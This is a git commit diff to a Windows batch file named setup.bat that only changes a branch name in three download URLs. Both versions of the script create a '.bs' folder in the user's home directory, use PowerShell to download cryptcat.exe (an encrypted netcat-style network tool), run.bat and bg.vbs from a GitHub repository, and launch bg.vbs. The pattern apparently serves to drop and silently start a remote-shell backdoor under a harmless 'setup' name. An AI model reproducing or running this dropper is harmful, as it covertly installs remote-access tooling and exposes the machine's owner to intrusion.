5e78205e2be6dc39f40f7a01f2f66febf770493c
blood-source <79127095+blood-source@users.noreply.github.com>
2021-02-16 18:45:00 -0600

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,7 +1,7 @@
 @ECHO OFF
 mkdir %HOMEDRIVE%%HOMEPATH%\.bs\
-powershell.exe Invoke-WebRequest -Uri "https://github.com/blood-source/testing/raw/main/cryptcat.exe" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\cryptcat.exe"
-powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/main/run.bat" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\run.bat"
-powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/main/bg.vbs" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\bg.vbs"
+powershell.exe Invoke-WebRequest -Uri "https://github.com/blood-source/testing/raw/bloodsource/cryptcat.exe" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\cryptcat.exe"
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/bloodsource/run.bat" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\run.bat"
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/bloodsource/bg.vbs" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\bg.vbs"
 cd /d %HOMEDRIVE%%HOMEPATH%\.bs\
 start bg.vbs
